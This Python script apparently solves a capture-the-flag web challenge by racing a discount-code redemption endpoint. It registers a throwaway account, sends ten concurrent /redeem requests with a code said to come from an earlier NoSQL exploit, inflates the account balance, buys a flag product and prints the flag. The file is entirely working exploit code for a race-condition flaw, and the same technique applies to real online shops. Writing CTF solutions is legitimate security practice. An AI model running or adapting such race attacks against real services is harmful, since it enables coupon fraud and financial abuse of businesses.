#!/usr/bin/env python3
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

def exploit():
    BASE_URL = "http://localhost" # change with actual challenge instance
    DISCOUNT_CODE = "HoHoHo25" # from NoSQL exploit

    session = requests.Session()
    username = f"raceuser_{int(time.time())}"
    password = "testpass123"

    r = session.post(f"{BASE_URL}/register-user", json={"username": username, "password": password})
    if r.status_code != 200:
        return False

    def send_single_request(_):
        try:
            start = time.time()
            resp = session.get(f"{BASE_URL}/redeem?discountCode={DISCOUNT_CODE}")
            dur = time.time() - start
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success"):
                    return {"success": True, "balance": data.get("newBalance", 0)}
            return {"success": False, "balance": 0}
        except Exception:
            return {"success": False, "balance": 0}

    results = []
    with ThreadPoolExecutor(max_workers=20) as ex:
        futures = [ex.submit(send_single_request, i) for i in range(10)]
        for fut in as_completed(futures):
            results.append(fut.result())

    balances = [r["balance"] for r in results if r["success"]]
    final_balance = max(balances) if balances else 0

    if final_balance >= 50:
        flag_resp = session.post(f"{BASE_URL}/store", json={"productId": 4})
        if flag_resp.status_code == 200:
            flag_data = flag_resp.json()
            if flag_data.get("success"):
                flag = flag_data.get("product", {}).get("FLAG")
                if flag:
                    print(flag)
                    sys.exit(0)
    return False

if __name__ == "__main__":
    exploit()
